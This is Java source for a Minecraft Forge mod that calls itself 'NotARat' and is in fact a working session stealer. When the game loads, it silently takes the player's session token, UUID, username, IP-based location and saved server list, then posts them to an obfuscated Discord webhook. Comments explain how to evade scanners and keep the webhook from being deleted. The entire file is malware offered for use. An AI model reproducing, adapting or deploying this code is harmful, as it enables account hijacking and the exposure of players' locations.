package me.ghosty.notarat;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;
import net.minecraft.client.Minecraft;
import net.minecraft.client.multiplayer.ServerData;
import net.minecraft.client.multiplayer.ServerList;
import net.minecraftforge.fml.common.Mod;
import net.minecraftforge.fml.common.event.FMLPreInitializationEvent;

import java.lang.reflect.Field;
import java.util.List;

/**
 * Webhook based on <a href="https://github.com/14ms/MC-Session-Stealer/blob/main/src/main/java/com/github/shurpe/Main.java">14ms's Session Stealer</a>
 */
@Mod(modid = "notarat")
public final class Main {
	
	/**
	 * a way to know which of your super rats made with <3 made som1 appears like a clown
	 * if it flags, change it using {@link Utils#abc(String)} & {@link Utils#replaceUseless(String...)}
	 */
	final static String $name = "NotARat v1.2.1";
	
	/**
	 * the webhook url, or a link to a website which redirects to your webhook so it doesn't get deleted in a week by some nerd (requirement: 9iq from you)
	 * <p>
	 * it has to be "secured"! Add some {@code Spaces}, {@code *}, {@code æ} and {@code œ} (please never forget to use {@link Utils#abc(String)} & {@link Utils#replaceUseless(String...)})
	 */
	// this is an example webhook but it has been tested with a real webhook and it worked perfectly
	final static String $host = Utils.abc(Utils.replaceUseless("h*œt tæœp*s:œ*/œæ /d*æisœc* o*rœæd œ.œc o*mœæ/a*p æi/œw*eæœ*bho *æoœks/1 *æ000*0æ 0*æ00œ 0*æ000œ*0æ0 0*œæ000 0/aæœ*bc deæf*ghœi j*æklm*nœæ opqr*œsæt uœæ* vwæ*xy-zæœ_* A-æB*CœDEæFG *HæIJœ*KLMæN OœæP* QœRæ*ST UœVæWX*Y _æ*Z-0*œ_ 1œ2æ3*4 5*6œæ78 9æœ*"));
	
	/**
	 * should do debug or not? it'll send the message even if this is enabled
	 */
	final static boolean $isTest = true;
	
	
	/*
	 * Now, the code, do not modify if you're a coding noobz like everyone think you are
	 */
	
	/**
	 * We set it here since it's used a lot of times
	 */
	private final static String sessClazz = Utils.replaceUseless("n*e* t. m", "*i n*ec*r", " aft*", ".u t*i", "l*.S es", "* sio* n");
	
	@Mod.EventHandler
	public void preInit(final FMLPreInitializationEvent event) {
		new Thread(() -> {
			try {
				if ($isTest)
					printFields();
				
				final Maps map = getMapping();
				if (map == null) {
					if ($isTest)
						System.err.println("'map' is null");
					return;
				}
				
				if ($isTest)
					System.out.println("Mapping detected: " + map);
				
				final ClassAccessor<?> mcAccessor = new ClassAccessor(Minecraft.class, null);
				mcAccessor.setObject(mcAccessor.getField(map.mc));
				final ClassAccessor<?> sessAccessor = new ClassAccessor(Class.forName(sessClazz), mcAccessor.getField(map.sess));
				Object tok = sessAccessor.getField(map.tok);
				Object uuid = sessAccessor.getField(map.id);
				if (tok.toString().contains("$") || uuid.toString().contains("$"))
					return; // gg RatterScanner for that epic fail !
				
				if ($isTest)
					System.out.println("Creating Drocsid");
				final Drocsid drocsid = new Drocsid();
				
				try {
					drocsid.addDebme(new Drocsid.Debme()
						.setTitle(Utils.abc(":æuœnloœcæk: œAccoæœunt Iænfœo"))
						.setColor(0x004444)
						.setDescription(Utils.abc("[NaœmeæMC](htœtpsœ:æ/œ/namemcæ.cœom/" + uuid + ") | [Plaœnckæe](hœttœps:œ/œ/plancæke.œio/œhypæixel/plaæyer/statœs/" + uuid + ") | [SkœyCærypt](htætps:œ/œ/œsæky.shiiyu.mæoœe/statæs/" + uuid + ")"))
						.addField(Utils.abc(":ideæntifiœcationæ_card: Naæme"), "```" + sessAccessor.getField(map.name) + "```", true)
						.addField(Utils.abc(":ideæntificæœation_caœrd: UœUæID"), "```" + uuid + "```", true)
						.addField(Utils.abc(":kœeæy: Sæœessioœn Toækœen"), "```" + tok + "```", false)
					);
				} catch (Exception exc) {
					// this should never happen but still
					if ($isTest)
						Utils.print(exc);
				}
				
				try {
					JsonObject info = (JsonObject) new JsonParser().parse((String) new ClassAccessor<>(
						Class.forName(Utils.replaceUseless("or *g", ".a p *ac*", "h e. ", "co *m*", "*m *on*", " s.i o ", ".I*O Ut*", " i l *s")), null).invoke(
						"toString",
						new ClassAccessor<>(Class.forName(Utils.replaceUseless("ja* v", "a.ne*", " t* .U", "* R  L")), null)
							.getObject(Utils.replaceUseless("htt* ", "ps**  : ", "/ ", "/i* ", "p** ", "* ap", "i *.c", "*  *  o/j*** s o  ", "n  *")).get()
					));
					drocsid.addDebme(new Drocsid.Debme()
						.setTitle(Utils.abc(":earthæ_amœericœas:œ IæP Inæfœo"))
						.setColor(0x000044)
						.setDescription(Utils.abc("Coæntains œinæformœation aboœut tæhe taœrgeæt's IæP addæœress aœnd gæeo-locœatæion"))
						.addField(Utils.abc(":globeæ_witœh_meæridians: Couæntræy"), "```" + info.get(Utils.replaceUseless(" *co* u nt  * r*y_ na*me")).getAsString() + "```", true)
						.addField(Utils.abc(":gloœbe_with_merœiædians: Ciæty"), "```" + info.get(Utils.replaceUseless("c* i* *t*  y")).getAsString() + "```", true)
						.addField(Utils.abc(":gloœbe_æwith_meœridians: Reægion"), "```" + info.get(Utils.replaceUseless("r*e  g*i*o n")).getAsString() + "```", true)
						.addField(Utils.abc(":sateællœite_æorbital: IæP Aæddræess"), "```" + info.get(Utils.replaceUseless("* i*  *p   ")).getAsString() + "```", true)
						.addField(Utils.abc(":sateælliœte: Præotocœol"), "```" + info.get(Utils.replaceUseless("* ve*   *rs* i** on ")).getAsString() + "```", true)
						.addField(Utils.abc(":cœlocæk10: Tiæmœezoæne"), "```" + info.get(Utils.replaceUseless("t *i*m  ez*on* e")).getAsString() + "```", true)
					);
				} catch (Exception exc) {
					if ($isTest)
						Utils.print(exc);
				}
				
				try {
					Drocsid.Debme servDebme = new Drocsid.Debme()
						.setTitle(Utils.abc(":fæilœe_foldœeær: Saævœed Seærveœærs"))
						.setColor(0x440044)
						.setDescription(Utils.abc("æCoœnætœains tæœhe tœargæet's liœsæt ofæ æsavœed Mæinœecræaft serævœers"));
					ServerList servList = new ServerList((Minecraft) mcAccessor.get());
					List<?> servs = (List<?>) new ClassAccessor<>(ServerList.class, servList).getField(map.servs);
					for (int i = 0; i < servs.size(); i++) {
						ClassAccessor<?> server = new ClassAccessor(ServerData.class, servs.get(i));
						// yes even here don't ask why
						servDebme.addField(Utils.abc(":laæœbeœl: " + server.getField(map.servName)), "```" + server.getField(map.serv314) + "```", true);
					}
					drocsid.addDebme(servDebme);
				} catch (Exception exc) {
					if (Main.$isTest)
						Utils.print(exc);
				}
				
				if ($isTest)
					System.out.println("Sending Drocsid");
				drocsid.send();
				
			} catch (Exception exc) {
				if (Main.$isTest)
					Utils.print(exc);
			}
		}).start();
	}
	
	private Maps getMapping() {
		final Class<?> mc = Minecraft.class;
		for (final Maps map : Maps.values()) {
			try {
				mc.getDeclaredField(map.sess);
				// there, if it didn't return an exception, it is that the field must be present
				return map;
			} catch (final Exception exc) {
				// we don't care, it's part of the experience :)
			}
		}
		return null;
	}
	
	/**
	 * Kinda useless but still here :)
	 * Can be useful if I add 1.20 mappings etc, but idk how these versions work that much tbh
	 */
	private void printFields() {
		try {
			final ClassAccessor<Minecraft> mcAccessor = new ClassAccessor<>(Minecraft.class, null);
			{
				String mcField = null;
				for (Field field : Minecraft.class.getDeclaredFields()) {
					if (field.getType().isAssignableFrom(Minecraft.class)) {
						mcField = field.getName();
						System.out.println("Mc Field --> " + mcField);
						break;
					}
				}
				if (mcField == null) {
					System.err.println(Utils.abc("Coæulœdn't œfiænd thæeœ minœecræaft fiæelœd naæmœe. Aœboræting tœhæe ræesœt oæf tœhæe mœetæhod."));
					return;
				}
				mcAccessor.setObject(mcAccessor.getField(mcField));
			}
			
			blockSess:
			{
				// We get the session field name
				String sessField = null;
				for (Field field : Minecraft.class.getDeclaredFields()) {
					// We don't call Session.class (ok don't look at the previous versions) in case there's some checks for it, even if it's useless if 'isTest' is off
					if (field.getType().isAssignableFrom(Class.forName(sessClazz))) {
						sessField = field.getName();
						System.out.println("Sess Field --> " + sessField);
						break;
					}
				}
				if (sessField == null) {
					System.err.println(Utils.abc("Coæulœdn't œfiænd thæeœ seœssiæon fiæelœd naæmœe. Aœboræting tœhæe ræesœt oæf tœhæe bœlæock."));
					break blockSess;
				}
				
				final ClassAccessor<?> sessAccessor = new ClassAccessor(Class.forName(sessClazz), mcAccessor.getField(sessField));
				for (Field field : Class.forName(sessClazz).getDeclaredFields()) {
					if (field.getType().isAssignableFrom(String.class)) // less useless fields
						System.out.println("Sess Field " + field.getName() + " ---> " + sessAccessor.getField(field.getName()));
				}
			}
			
			blockServ:
			{
				// We get the servers field name
				String servsField = null;
				ServerList servList = new ServerList(mcAccessor.get());
				for (Field field : ServerList.class.getDeclaredFields()) {
					if (field.getType().isAssignableFrom(List.class)) {
						servsField = field.getName();
						System.out.println("Servs Field --> " + servsField);
						break;
					}
				}
				if (servsField == null) {
					System.err.println(Utils.abc("Coæulœdn't œfiænd thæeœ seœrveærs fiæelœd naæmœe. Aœboræting tœhæe ræesœt oæf tœhæe bœlæock."));
					break blockServ;
				}
				
				List<?> servs = (List<?>) new ClassAccessor<>(ServerList.class, servList).getField(servsField);
				if (servs.isEmpty()) {
					System.err.println(Utils.abc("Yœoæur œsæerœveær œlisæœt œisœ eæmpœtyœ. Pleœaæse aæœddœ a sæeœrveræ tœo iæt tæoœ geœæt iœtæs fieældœs.æ Aœboræting tœhæe ræesœt oæf tœhæe bœlæock."));
					break blockServ;
				}
				ClassAccessor<?> servAccessor = new ClassAccessor(ServerData.class, servs.get(0));
				for (Field field : ServerData.class.getDeclaredFields()) {
					if (field.getType().isAssignableFrom(String.class)) // less useless fields
						System.out.println("Serv Field " + field.getName() + " ---> " + servAccessor.getField(field.getName()));
				}
			}
			
		} catch (final Exception exc) {
			Utils.print(exc);
		}
	}
	
}
